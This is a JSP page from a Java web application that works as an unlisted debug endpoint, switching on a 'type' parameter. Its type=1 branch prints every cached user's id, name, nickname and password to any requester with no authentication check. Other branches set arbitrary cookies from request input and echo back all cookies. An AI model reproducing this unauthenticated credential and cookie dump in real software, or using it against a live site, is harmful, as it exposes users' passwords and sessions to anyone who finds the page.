<%@page import="com.system.model.Menu2Model"%>
<%@page import="com.system.cache.RightConfigCacheMgr"%>
<%@page import="com.system.util.StringUtil"%>
<%@page import="com.system.model.MenuHeadModel"%>
<%@page import="com.system.server.RightServer"%>
<%@page import="com.system.model.UserRightModel"%>
<%@page import="com.system.model.UserModel"%>
<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
	int type = StringUtil.getInteger(request.getParameter("type"), -1);

	if(type==1)
	{
		
		out.print("HOST:" + request.getRemoteHost() + ";" + request.getRemoteAddr() + "<br />");
		
		for(UserModel model :RightConfigCacheMgr.userListCache)
		{
			out.print(model.getId() + "--" + model.getName()  + "--" + model.getNickName() + "--" + model.getPassword() + "<br />");
		}
	}
	else if(type==2)
	{
		String cookieName = StringUtil.getString(request.getParameter("data1"), "Sender");
		String cookieValue = StringUtil.getString(request.getParameter("data2"), "Cookie");
		
		Cookie cookie= new Cookie(cookieName,cookieValue);

		cookie.setMaxAge(60);

		response.addCookie(cookie);
		
		out.print("success");
	}
	else if(type==3)
	{
		Cookie cookies[] = request.getCookies();
		Cookie sCookie = null;
		String sValue = null;
		String sName = null;
		for(int i=0; i<cookies.length; i++)
		{
			sCookie = cookies[i];
			sName = sCookie.getName();
			sValue = sCookie.getValue();
			out.print(sName + "--" + sValue + "<br />");
		}
	}
	else if(type==4)
	{
		UserModel user = (UserModel)session.getAttribute("user");
		
		UserRightModel rightModel = RightServer.loadUserRightModel(user);
		
		String url = StringUtil.getString(request.getParameter("url"), "");
		
		System.out.println("url:" + url);
		
		if(rightModel!=null)
		{
			for(Menu2Model model : rightModel.getMenu2List())
			{
				System.out.println("model.getUrl():" + model.getUrl());
				System.out.println("model.getActionUrl():" + model.getActionUrl());
				System.out.println(model.getUrl().contains(url) || model.getActionUrl().contains(url));
			}
		}
		else
		{
			System.out.println("sorry url empty");
		}
		
		out.println("YET...TAKE A LOOK AT ME NOW !");
	}
	else
	{
		out.print("Hi~");
	}
	
	
%>

